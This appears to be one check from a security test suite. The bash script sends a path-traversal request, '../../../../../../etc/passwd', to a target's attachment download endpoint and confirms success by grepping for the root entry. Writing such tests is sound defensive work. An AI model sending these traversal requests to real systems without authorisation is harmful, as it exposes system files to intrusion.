#!/usr/bin/env bash
# TRAVERSAL-001 (CWE-22): the download filename escapes the uploads dir to read /etc/passwd.
set -e; . "$(dirname "$0")/_lib.sh"
curl -s "$TARGET/api/attachments/download?name=../../../../../../etc/passwd" | grep -Eq 'root:.*:0:0'
